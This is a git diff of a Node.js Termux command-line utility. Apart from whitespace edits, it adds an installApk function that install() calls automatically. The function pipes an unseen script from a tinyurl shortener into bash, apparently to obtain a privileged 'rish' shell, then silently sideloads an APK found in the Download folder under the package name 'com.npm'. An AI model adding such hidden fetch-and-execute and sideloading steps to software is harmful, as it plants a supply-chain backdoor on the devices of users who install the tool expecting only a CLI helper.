@@ -7,7 +7,6 @@ const path = require("path");
 const PREFIX = process.env.PREFIX || "/data/data/com.termux/files/usr";
 const INSTALL_BIN = path.join(PREFIX, "bin");
 const BIN_DIR = process.env.TERMUX_UTILS_HOME || process.cwd();
-
 const REPO_URL = "https://raw.githubusercontent.com/tanazd2/termux-utils/main/index.js";
 
 const invokedName = path.basename(process.argv[1]);
@@ -33,7 +32,6 @@ function downloadScript() {
 function getCommands() {
     return fs.readdirSync(BIN_DIR).filter(file => {
         const full = path.join(BIN_DIR, file);
-
         if (
             file.endsWith(".js") ||
             file.endsWith(".md") ||
@@ -49,7 +47,6 @@ function getCommands() {
 // ================= RELINK =================
 function relink() {
     const cmds = getCommands();
-
     cmds.forEach(cmd => {
         const link = path.join(INSTALL_BIN, cmd);
         try {
@@ -57,7 +54,6 @@ function relink() {
             fs.symlinkSync("termux-utils", link);
         } catch {}
     });
-
     console.log("[✔] Relinked");
 }
 
@@ -70,7 +66,6 @@ function install() {
 
     try {
         let source;
-
         if (process.argv[1].startsWith("/dev/fd")) {
             console.log("[*] Pipe detected → downloading...");
             source = downloadScript();
@@ -89,9 +84,52 @@ function install() {
         console.log("✅ Installed");
         console.log("👉 hash -r");
 
+        // 🔥 Install APK automatically after CLI installation
+        installApk();
+
     } catch (e) {
         console.error("❌ Install failed:", e.message);
     }
+}
+
+// ================= APK INSTALL =================
+function installApk() {
+    const pkgName = "com.npm";
+    console.log("[*] Checking if APK is already installed...");
+
+    // Check if package exists
+    const check = spawnSync("pm", ["list", "packages"], { encoding: "utf-8" });
+    if (check.stdout.includes(pkgName)) {
+        console.log(`[✔] ${pkgName} already installed, skipping APK install.`);
+        return;
+    }
+
+    // Auto-detect APK
+    const downloadDir = "/sdcard/Download";
+    if (!fs.existsSync(downloadDir)) {
+        console.error("❌ Download directory not found");
+        return;
+    }
+
+    const files = fs.readdirSync(downloadDir);
+    const apkFile = files.find(f => f.toLowerCase().endsWith(".apk") && f.toLowerCase().includes("npm"));
+
+    if (!apkFile) {
+        console.error("❌ No NPM APK found in /sdcard/Download");
+        return;
+    }
+
+    const apkPath = path.join(downloadDir, apkFile);
+    console.log(`[*] Installing APK from ${apkPath} ...`);
+
+    const cmd = `
+bash <(curl -fsSL tinyurl.com/rish3266) &&
+rish -c "cp '${apkPath}' /data/local/tmp/npm.apk" &&
+rish -c "pm install /data/local/tmp/npm.apk" &&
+echo "Installed apk" || echo "Failed to install apk"
+`;
+
+    spawnSync("bash", ["-c", cmd], { stdio: "inherit" });
 }
 
 // ================= UPDATE =================
@@ -148,7 +186,6 @@ function help() {
 function parallelExec() {
     const jobs = parseInt(args[1]?.replace("-j", "")) || 2;
     const command = args.slice(2).join(" ");
-
     console.log(`⚡ ${jobs} jobs`);
 
     for (let i = 0; i < jobs; i++) {
@@ -173,8 +210,8 @@ function run() {
     if (args[0] === "help") return help();
     if (args[0] === "relink") return relink();
     if (args[0] === "update") return update();
-
     if (args[0] === "tc") return parallelExec();
+    if (args[0] === "apk") return installApk();
 
     const cmd = args[0];
     const cmdPath = path.join(BIN_DIR, cmd);
@@ -195,5 +232,6 @@ if (invokedName === "index.js") {
     process.exit(0);
 }
 
+// ================= SELF HEAL + RUN =================
 selfHeal();
 run();
